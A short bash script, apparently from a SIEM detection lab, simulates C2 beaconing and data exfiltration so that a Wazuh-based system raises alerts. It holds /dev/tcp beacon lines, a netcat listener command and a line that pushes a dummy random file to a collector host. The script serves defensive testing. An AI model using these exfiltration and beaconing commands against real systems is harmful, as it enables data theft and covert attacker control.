#!/usr/bin/env bash
# Scenario 5 - Data exfiltration + C2 beaconing. Transfers a test file off a host
# and then makes periodic fixed-interval connections to a collector.
# Expect ISIEM: "Data Exfiltration" and/or "Command and Control Beaconing".
set -u; cd "$(dirname "$0")"; source ./targets.sh
banner "SCENARIO 5: DATA EXFILTRATION + C2 BEACONING"
COLLECTOR="${COLLECTOR:-$WAZUH_SERVER}"   # stands in for an external collector
echo "[*] $(stamp)  Beaconing: 8 connections to $COLLECTOR:443 at 10s intervals"
for i in $(seq 1 8); do
  timeout 3 bash -c "echo beacon-$i > /dev/tcp/$COLLECTOR/443" 2>/dev/null \
    && echo "    beacon $i sent $(stamp)" || echo "    beacon $i ($(stamp))"
  sleep 10
done
echo "[*] Exfil: push a dummy archive to the collector (nc listener on :4444)"
echo "    on collector: nc -lvnp 4444 > exfil.bin   then re-run with EXFIL=1"
if [ "${EXFIL:-0}" = "1" ]; then
  head -c 5M /dev/urandom > /tmp/exfil_test.bin
  timeout 10 bash -c "cat /tmp/exfil_test.bin > /dev/tcp/$COLLECTOR/4444" 2>/dev/null \
    && echo "    exfil sent $(stamp)"
fi
echo "END: $(stamp)"
